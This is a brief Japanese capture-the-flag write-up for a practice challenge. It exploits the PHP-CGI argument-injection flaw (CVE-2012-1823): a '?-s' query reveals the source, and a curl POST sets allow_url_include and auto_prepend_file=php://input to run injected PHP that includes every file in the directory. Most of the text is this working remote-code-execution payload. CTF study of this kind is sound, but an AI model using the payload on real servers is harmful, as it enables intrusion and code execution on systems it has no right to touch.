# 1

```
http://ctfq.sweetduet.info:10080/~q12/?-s
```
したらソースが見れる。  
あとは

```
http://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html
```
を参考にディレクトリ表示させるphpスクリプト書いてPOSTで投げる。

```sh
curl -v -X POST 'http://ctfq.sweetduet.info:10080/\~q12/index.php\?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input' \
	-d '<?php $dir = "./"; if( is_dir( $dir ) && $handle = opendir( $dir ) ) { while( ($file = readdir($handle)) !== false ) { if( filetype( $path = $dir . $file ) == "file" ) { require $path ;}}} ?>'

```